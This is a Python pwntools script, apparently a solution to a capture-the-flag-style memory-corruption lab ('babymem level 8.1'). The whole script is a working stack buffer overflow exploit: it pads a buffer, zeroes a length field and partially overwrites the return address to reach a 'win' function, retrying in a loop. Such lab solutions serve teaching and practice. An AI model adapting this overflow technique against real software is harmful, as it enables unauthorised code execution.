from pwn import *

while(1):
    
    # Init
    elf = ELF("/challenge/babymem_level8.1")
    
    buffer_length = int("48", 16) #local_48
    win_auth_offset = b"\xfc\x22"
    variable_local_28_which_control_the_length = int("28", 16) #local_28
    distance_between_buffer_and_local_28 = buffer_length - variable_local_28_which_control_the_length - 8

    print(str(distance_between_buffer_and_local_28))

    io = elf.process()

    # Payload
    payload = b"A"*distance_between_buffer_and_local_28 + p64(0x0) + b"A"* (buffer_length - distance_between_buffer_and_local_28 - 8) + win_auth_offset

    # Interaction
    io.recvuntil("size:")
    io.sendline(str(buffer_length + 2))

    io.recvuntil("bytes)!")
    io.sendline(payload)

    io.interactive()

